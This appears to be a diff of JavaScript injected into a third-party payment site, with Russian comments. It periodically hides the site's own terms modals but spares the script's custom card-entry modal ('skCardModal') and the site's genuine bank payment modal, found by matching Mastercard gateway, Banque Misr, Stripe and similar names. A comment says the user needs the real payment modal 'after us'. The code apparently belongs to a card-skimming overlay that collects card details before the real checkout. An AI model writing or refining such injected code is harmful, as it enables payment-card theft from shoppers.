@@ -31,18 +31,23 @@
 
   var INJECTED = false;
 
-  /* Их модалка с правилами глючит (после Accept остаётся) — чистим фоново */
+  /* Их модалка с правилами глючит (после Accept остаётся) — чистим фоново.
+     ВАЖНО: закрываем ТОЛЬКО terms/agree-модалки; их платёжную модалку
+     (с iframe gateway / карточными полями) НЕ ТРОГАЕМ — она нужна юзеру после нас. */
   function cleanupTheirModals() {
     try {
       document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
         if (m.id === 'skCardModalWrap') return;
+        if (m.id === 'skCardModal') return;
+        var html = m.innerHTML || '';
+        // платёжная/банковская модалка — пропускаем
+        if (/gateway\.mastercard|banquemisr|bankmisr|card-number|securo|paygate|stripe|ryft/i.test(html)) return;
+        var m4 = m.querySelector('#skCardModal');
+        if (m4) return;
         m.classList.remove('show');
         m.style.display = 'none';
         m.setAttribute('aria-hidden', 'true');
       });
-      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
-      document.body.classList.remove('modal-open');
-      document.body.style.overflow = '';
     } catch (e) {}
   }
   setInterval(cleanupTheirModals, 900);
